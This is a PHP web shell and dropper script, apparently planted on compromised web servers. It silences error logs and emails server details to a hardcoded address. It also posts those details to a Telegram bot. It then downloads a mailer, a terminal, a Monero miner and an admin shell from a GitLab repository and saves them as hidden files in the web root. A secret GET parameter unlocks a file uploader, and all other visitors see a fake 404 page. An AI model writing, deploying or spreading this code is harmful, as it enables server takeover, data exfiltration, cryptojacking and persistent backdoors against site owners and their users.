<?php
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
function ip() {
	$ipas = '';
if(getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}
$disfunc = @ini_get("disable_functions");
if(empty($disfunc)) {
	$disfc = "NONE";
} else {
	$disfc = $disfunc;
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$server_ip = gethostbyname($_SERVER['HTTP_HOST']);
$software = $_SERVER['SERVER_SOFTWARE'];
$lihat = ip();
$sys = php_uname();
$tujuanmail = 'setorankerangajaib@hotmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "Info server\r\nLetak-> $x_path \r\nIP Address : [ " . ip() . " ]\r\nUname: ".php_uname()."\r\nSoftware: $software \r\nPHP version:".PHP_VERSION."\r\nPHP os: ".PHP_OS."\r\nServer IP : $server_ip \r\nYour IP: $lihat \r\nUser: $ ($uid) | Group: $group ($gid) \r\nSafe Mode: $sm \r\nDisable Function: $disfc";
mail($tujuanmail, "IDBTE4M UPLOADER RESULT", $pesan_alert, "[ " . ip() . " ]");
$apiToken = "XXX";
$data = [ 'chat_id' => '-4531531027', 'text' => "Letak : $x_path\r\nIP Server : $server_ip \r\nIP Address : $lihat   \r\n Software : $software\r\nYour IP: $lihat \r\nUser: $ ($uid) | Group: $group ($gid) \r\nSafe Mode: $sm \r\nDisable Function: $disfc \r\n Uname : \r\n $sys \r\n " ];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
if(in_array  ('curl', get_loaded_extensions())){
	function http_get($url){
		$im = curl_init($url);
		curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($im, CURLOPT_HEADER, 0);
		return curl_exec($im);
		curl_close($im);
	}
}else{
	function http_get($url){
		$resutlt = file_get_contents($url);
		return $resutlt;
	}
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/.send.php" ;
$text = http_get('https://gitlab.com/cafcbr40ck/PasukanBeraniMati/-/raw/main/sendinbox-server.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/.term.php" ;
$text1 = http_get('https://gitlab.com/cafcbr40ck/PasukanBeraniMati/-/raw/main/term.php');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/.xmr.php" ;
$text2 = http_get('https://gitlab.com/cafcbr40ck/PasukanBeraniMati/-/raw/main/xmr.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/.admin.php" ;
$text3 = http_get('https://gitlab.com/cafcbr40ck/PasukanBeraniMati/-/raw/main/s.txt');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
if(isset($_GET['silitan'])){
	$homee = $_SERVER['DOCUMENT_ROOT'];
	$cgfs = explode("/",$homee);
	$build = '/'.$cgfs[1].'/'.$cgfs[2].'/.cagefs';
	if(is_dir($build)) {
		echo("CloudLinux => True");
	} else {
		echo("CloudLinux => False");
	}

	if(strpos('public', $homee) == True) {
		$dirs = str_replace("public", "", $homee)."/vendor/aws";
		$dirs2 = str_replace("public", "", $homee)."/vendor/aws-sdk-php";
		if(is_dir($dirs)) {
			echo('<br>AWS SDK => True');
		}
		elseif(is_dir($dirs2)) {
			echo('<br>AWS SDK => True');
		}
		else {
			echo('<br>AWS SDK => False');
		}
	} else {
		$dirs = $homee."/vendor/aws";
		$dirs2 = $homee."/vendor/aws-sdk-php";
		if(is_dir($dirs)) {
			echo('<br>AWS SDK => True');
		}
		elseif(is_dir($dirs2)) {
			echo('<br>AWS SDK => True');
		}
		else {
			echo('<br>AWS SDK => False');
		}
	}
	echo '<center><h1>Pasukan Berani Mati</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br>';
	echo 'Curl: ', function_exists('curl_version') ? 'Enabled' : 'Disabled';
	echo '<br>';
	print "\n";$disable_functions = @ini_get("disable_functions"); 
	echo "<br>DisablePHP=".$disable_functions; print "\n";
	echo '<h2>CaFc_Br40ck</h2><br><font style="Arial"><font color="red"><center><b><br><br>Directory: '.getcwd().' <br></b><br><form action=""method="post" enctype="multipart/form-data" name="uploader" ></center><br><center><input type="file" name="file" size="50"><input name="_zx" type="submit"  value="Upload"/></form></center>';
	if($_POST['_zx'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
			echo '<center><b><br><br><b>File Uploaded :<a href="'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b><br><br></center>';
		}else {
			echo '<b>'.$_FILES['file']['name'].' Not Uploaded.</b>';
		}
	}
} else{
	header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
	
}
?>
